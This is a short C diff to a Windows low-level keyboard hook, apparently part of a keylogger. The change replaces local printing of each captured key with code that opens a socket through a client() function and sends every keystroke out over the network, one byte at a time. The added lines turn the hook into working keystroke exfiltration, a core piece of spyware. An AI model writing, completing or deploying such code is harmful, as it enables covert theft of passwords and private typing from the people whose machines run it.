@@ -39,8 +39,9 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         {
             case WM_KEYDOWN:
             PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
-            wchar_t c = VKCodeToUnicode(p->vkCode);
-            wprintf(L"%lc\n", c);
+            char c = VKCodeToUnicode(p->vkCode);
+            SOCKET ConnectSocket = client();
+            send(ConnectSocket, &c, 1, 0);
             break;
         }
     }
